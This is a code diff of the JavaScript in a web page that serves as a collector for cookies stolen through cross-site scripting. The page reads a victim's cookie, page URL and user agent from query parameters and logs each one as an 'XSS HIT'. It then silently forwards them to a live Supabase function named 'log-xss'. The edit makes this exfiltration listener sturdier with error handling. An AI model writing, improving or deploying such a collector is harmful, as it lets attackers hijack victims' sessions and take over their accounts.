@@ -1,6 +1,8 @@
 <script>
     const logsDiv = document.getElementById('logs');
-    const BACKEND_URL = 'https://viwictbgpkifzlwltcpw.supabase.co/functions/v1/log-xss';  // ← PASTE YOUR URL HERE
+    
+    // === PUT YOUR REAL SUPABASE URL HERE ===
+    const BACKEND_URL = 'https://viwictbgpkifzlwltcpw.supabase.co/functions/v1/log-xss';
 
     function loadLogs() {
         const savedLogs = localStorage.getItem('xssLogs') || '=== Previous Logs ===\n\n';
@@ -8,35 +10,47 @@
     }
 
     function addLog() {
-        const params = new URLSearchParams(window.location.search);
-        const cookie = params.get('c') || 'no_cookie';
-        const url = params.get('u') || 'no_url';
-        const time = new Date().toISOString();
-        const userAgent = navigator.userAgent;
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const cookie = params.get('c') || '[NO COOKIE]';
+            const url = params.get('u') || '[NO URL]';
+            const time = new Date().toISOString();
+            const userAgent = navigator.userAgent || '[UNKNOWN UA]';
 
-        const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\nUser-Agent: ${userAgent}\n========================\n\n`;
+            const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\nUser-Agent: ${userAgent}\n========================\n\n`;
 
-        // Show in browser (local view)
-        logsDiv.innerHTML += newLog;
-        localStorage.setItem('xssLogs', logsDiv.innerHTML);
+            // Show locally
+            logsDiv.innerHTML += newLog;
+            localStorage.setItem('xssLogs', logsDiv.innerHTML);
 
-        // === SEND TO SUPABASE (global logging) ===
-        const sendParams = new URLSearchParams({
-            c: cookie,
-            u: url,
-            ua: userAgent
-        });
+            // Send to Supabase
+            if (BACKEND_URL.includes('YOUR-PROJECT-REF') || BACKEND_URL === '') {
+                logsDiv.innerHTML += 'ERROR: BACKEND_URL is not set correctly!\n';
+                return;
+            }
 
-        fetch(BACKEND_URL + '?' + sendParams.toString(), {
-            method: 'GET',
-            mode: 'no-cors'
-        }).catch(() => {});   // silent fail is fine
+            const sendParams = new URLSearchParams({ c: cookie, u: url, ua: userAgent });
 
-        console.log(newLog);
+            fetch(BACKEND_URL + '?' + sendParams.toString(), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).catch(err => {
+                console.error('Fetch error:', err);
+                // Don't break the page
+            });
+
+            console.log(newLog);
+        } catch (e) {
+            console.error('addLog error:', e);
+            logsDiv.innerHTML += 'JS Error: ' + e.message + '\n';
+        }
     }
 
+    // Initialize
     loadLogs();
     if (window.location.search) {
         addLog();
+    } else {
+        logsDiv.innerHTML += 'Listener loaded. Add ?c=...&u=... to test.\n';
     }
 </script>
